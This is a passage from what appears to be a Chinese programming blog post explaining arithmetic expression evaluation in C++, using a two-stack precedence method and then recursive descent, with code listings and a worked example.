&#125;</span><br><span class="line">    <span class="keyword">return</span> priority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">isp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//栈内优先级</span></span><br><span class="line">    <span class="type">int</span> priority=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            priority=<span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            priority=<span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            priority=<span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            priority=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> priority;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">char</span>&gt; operators;<span class="comment">//操作数栈</span></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">double</span>&gt; operands;<span class="comment">//运算符栈</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">basic_operate</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;op,<span class="type">const</span> <span class="type">double</span> &amp;first,<span class="type">const</span> <span class="type">double</span> &amp;second)</span>&#123;<span class="comment">//根据op运算符计算first op second的值</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            result=first+second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            result=first-second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            result=first*second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            result=first/second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;<span class="comment">//删除str中的空格</span></span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">exp</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">exp</span>+=c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDigit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//判断是否为数字</span></span><br><span class="line">    <span class="keyword">return</span> c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>||c==<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isValidOperator</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//c是否为合法运算符</span></span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">canPushOperator</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//判断是否可以压符号栈</span></span><br><span class="line">    <span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">matchBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//判断是否匹配括号</span></span><br><span class="line">    <span class="keyword">return</span> !operators.empty()&amp;&amp;isp(operators.top())==icp(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">getTwoOperands</span><span class="params">(<span class="type">double</span> &amp;first,<span class="type">double</span> &amp;second)</span>&#123;<span class="comment">//取得操作数栈顶两个</span></span><br><span class="line">    <span class="keyword">if</span>(operands.size()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        Invalid=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    first=operands.top();</span><br><span class="line">    operands.pop();</span><br><span class="line">    second=operands.top();</span><br><span class="line">    operands.pop();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">aftermath</span><span class="params">()</span>&#123;<span class="comment">//扫描完毕,处理后事</span></span><br><span class="line">    <span class="type">double</span> first,second;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    <span class="keyword">while</span>(!operators.empty())&#123;<span class="comment">//每次弹一个符号,两个数,计算之后结果再压回操作数栈</span></span><br><span class="line">        op=operators.top();</span><br><span class="line">        operators.pop();</span><br><span class="line">        <span class="keyword">if</span>(!getTwoOperands(first,second))&#123;</span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        operands.push(basic_operate(op,first,second));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> operands.top();<span class="comment">//到最后如果无误,符号栈应该弹空,操作数只剩一个栈顶,就是最终结果</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;err)</span>&#123;</span><br><span class="line">    <span class="built_in">cerr</span>&lt;&lt;<span class="string">&quot;error:&quot;</span>&lt;&lt;err&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;expression)</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> buffer;<span class="comment">//操作数转换缓冲区</span></span><br><span class="line">    <span class="type">double</span> digit;</span><br><span class="line">    <span class="type">bool</span> digit_flag=<span class="number">0</span>;<span class="comment">//连续取操作数开关</span></span><br><span class="line">    <span class="type">double</span> first,second;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    <span class="type">double</span> result;</span><br><span class="line">    <span class="type">int</span> length=expression.length();</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;++i)&#123;</span><br><span class="line">        c=expression[i];</span><br><span class="line">        <span class="keyword">if</span>(isDigit(c))&#123;</span><br><span class="line">            <span class="keyword">if</span>(digit_flag==<span class="literal">false</span>)&#123;</span><br><span class="line">                digit_flag=<span class="literal">true</span>;</span><br><span class="line">                buffer=c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> buffer+=c;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;actived&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!isValidOperator(c))&#123;</span><br><span class="line">            error(<span class="string">&quot;inValidOperator&quot;</span>);</span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(digit_flag==<span class="literal">true</span>)&#123;</span><br><span class="line">            digit_flag=<span class="literal">false</span>;</span><br><span class="line">            digit=stod(buffer);</span><br><span class="line">            operands.push(digit);</span><br><span class="line">            buffer=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(canPushOperator(c))&#123;</span><br><span class="line">            operators.push(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(matchBracket(c))&#123;</span><br><span class="line">            operators.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            op=operators.top();</span><br><span class="line">            operators.pop();</span><br><span class="line">            <span class="keyword">if</span>(!getTwoOperands(first,second))&#123;</span><br><span class="line">                error(<span class="string">&quot;lack of operands&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            operands.push(basic_operate(op,first,second));</span><br><span class="line">            --i;<span class="comment">//回溯,c重新与符号栈顶进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描完毕,但是如果最后是一个操作数,它此时还留在buffer缓冲区中,需要压栈</span></span><br><span class="line">    <span class="keyword">if</span>(digit_flag==<span class="literal">true</span>)&#123;</span><br><span class="line">        digit=stod(buffer);</span><br><span class="line">        operands.push(digit);</span><br><span class="line">        digit_flag=<span class="literal">false</span>;</span><br><span class="line">        buffer=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result=aftermath();<span class="comment">//处理后事,重要</span></span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> expression=removeBlank(str);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;expression&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="type">double</span> result=evalExpression(expression);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> text=<span class="string">&quot;1+2*3*4+(1+2)*3&quot;</span>;</span><br><span class="line">    <span class="type">double</span> result=calc(text);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="递归下降算法">递归下降算法</h3>
<p>三个函数,分成三层</p>
<p>最高层,将整个表达式看成若干项的和差,维护一个result,从左到右累加各项的和差.每一项都要扔给中间层函数进行计算</p>
<p>中间层,将最高层给的每一项都视为一个积式,维护一个result,从左到右累乘各项的积商.每一项都要扔给底层函数进行计算</p>
<p>最底层,将中间层给的每一项都视为一个数或者一个括号.根据是否有左括号进行区分.对于数就字符串转数然后返回了,对于括号则将括号里的表达式视为一个顶层和差式,扔给最高层</p>
<blockquote>
<p>比如<code>expression=1+(2+3)*4-5</code></p>
<p>最高层evalExpression会将这个表达式拆分成若干term的积</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">evalExpression(expression):</span><br><span class="line">	<span class="keyword">return</span> evalTerm(term1)+evalTerm(term2)-evalTerm(term3)</span><br><span class="line">    	<span class="comment">//term1=1</span></span><br><span class="line">    	<span class="comment">//term2=(2+3)*4</span></span><br><span class="line">    	<span class="comment">//term3=5</span></span><br></pre></td></tr></table></figure>
<p>然后每个term都会往下扔,甩锅给中层函数evalTerm,其中term2具有代表性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evalTerm(term2):</span><br><span class="line">	<span class="keyword">return</span> evalFactor(factor1)*evalFactor(factor2)</span><br><span class="line">	<span class="comment">//factor1=(2+3)</span></span><br><span class="line">	<span class="comment">//factor2=4</span></span><br></pre></td></tr></table></figure>
<p>然后每个factor又会往下扔</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evalFactor((<span class="number">2</span>+<span class="number">3</span>)):</span><br><span class="line">	<span class="keyword">return</span> evalExpression(<span class="number">2</span>+<span class="number">3</span>)<span class="comment">//我的天呐,底层工具人儿也有指使顶层人上人儿的一天?</span></span><br><span class="line">evalFactor(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>底层工具人儿evalFactor算完了中层工具人儿evalTerm的任务之后,把值交给中层工具人儿</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evalTerm(term2):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>中层工具人儿evalTerm算完了之后把值交给顶层人上人儿evalExpression</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evalExpression(expression):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>+<span class="number">20</span><span class="number">-5</span></span><br></pre></td></tr></table></figure>
<p>如此整个表达式就求完了</p>
</blockquote>
<p>完整程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> Invalid;<span class="comment">//模块全局变量,失效标记,进行新的计算之前首先应该检查是否失效,失效则可以偷懒了</span></span><br><span class="line"><span class="type">int</span> pos;<span class="comment">//expression[pos],当前扫描位置,实时后移</span></span><br><span class="line"><span class="built_in">string</span> expression;<span class="comment">//表达式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///递归下降求解表达式</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">()</span>;<span class="comment">//计算器</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">()</span>;<span class="comment">//将str视为若干项的和差</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalTerm</span><span class="params">()</span>;<span class="comment">//将str视为若干项的积商</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalFactor</span><span class="params">()</span>;<span class="comment">//将str视为单个项或者一个括号表达式</span></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>;<span class="comment">//去除输入表达式中的空格</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span>&#123;<span class="comment">//检查是否扫描完毕</span></span><br><span class="line">    <span class="keyword">return</span> expression[pos]==<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAdd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isMinus</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLevel1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//是否是顶层人上人儿的工作</span></span><br><span class="line">    <span class="keyword">return</span> isAdd(c)||isMinus(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isMultiply</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDivide</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLevel2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//是否是中层工具人儿的工作</span></span><br><span class="line">    <span class="keyword">return</span> isDivide(c)||isMultiply(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDigit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDot</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;<span class="comment">//去除str中的空格</span></span><br><span class="line">    <span class="built_in">string</span> expression;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;<span class="comment">//排除空格</span></span><br><span class="line">            expression+=c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> expression;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;</span><br><span class="line">    pos=<span class="number">0</span>;<span class="comment">//复位</span></span><br><span class="line">    Invalid=<span class="number">0</span>;</span><br><span class="line">    expression=removeBlank(str);</span><br><span class="line">    <span class="type">double</span> result=evalExpression();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">()</span>&#123;<span class="comment">//顶层人上人儿</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;<span class="comment">//累加和</span></span><br><span class="line">    <span class="type">double</span> term;<span class="comment">//term表示一个&quot;加数&quot;</span></span><br><span class="line">    <span class="type">char</span> op;<span class="comment">//存放一个运算符</span></span><br><span class="line">    </span><br><span class="line">    term=evalTerm();<span class="comment">//最左边应该是一个值,不应该是一个运算符(负号也算是数的一部分)</span></span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;<span class="comment">//检查evalTerm函数是否报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result+=term;<span class="comment">//如果没有报错就可以累加了</span></span><br><span class="line">    <span class="keyword">while</span>(!isEnd())&#123;<span class="comment">//从左向右扫描,最宽泛的停止范围就是扫描到头了</span></span><br><span class="line">        op=expression[pos];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!isLevel1(op))&#123;<span class="comment">//如果将各项都视为因数之后,还是遇到了非顶层运算符,比如括号,就应该返回结果了</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;<span class="comment">//执行到此说明op是顶层的运算符,即加或者减法</span></span><br><span class="line">        term=evalTerm();<span class="comment">//pos后移越过了op,下一个理论上就应该是一个和式</span></span><br><span class="line">        <span class="keyword">if</span>(Invalid)&#123;<span class="comment">//检查evalTerm是否有效</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isAdd(op))&#123;<span class="comment">//根据op是加或者减决定刚算出的term如何累计到result上</span></span><br><span class="line">            result+=term;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(isMinus(op))&#123;</span><br><span class="line">            result-=term;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalTerm</span><span class="params">()</span>&#123;<span class="comment">//中层工具人儿,逻辑与evalExpression几乎相同</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">1</span>;</span><br><span class="line">    <span class="type">double</span> factor;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line"></span><br><span class="line">    factor=evalFactor();</span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result*=factor;</span><br><span class="line">    <span class="keyword">while</span>(!isEnd())&#123;</span><br><span class="line">        op=expression[pos];</span><br><span class="line">        <span class="keyword">if</span>(!isLevel2(op))&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        factor=evalFactor();</span><br><span class="line">        <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isMultiply(op))&#123;</span><br><span class="line">            result*=factor;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(isDivide(op))&#123;</span><br><span class="line">            result/=factor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalFactor</span><span class="params">()</span>&#123;<span class="comment">//底层工具人儿</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> buffer;</span><br><span class="line">    <span class="type">bool</span> isNegetive=<span class="number">0</span>;<span class="comment">//负数标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(expression[pos]==<span class="string">&#x27;-&#x27;</span>)&#123;<span class="comment">//首先检查是不是负数,</span></span><br><span class="line">        isNegetive=<span class="literal">true</span>;<span class="comment">//命中负号,isNegetive支起来</span></span><br><span class="line">        ++pos;<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isLeftBracket(expression[pos]))&#123;<span 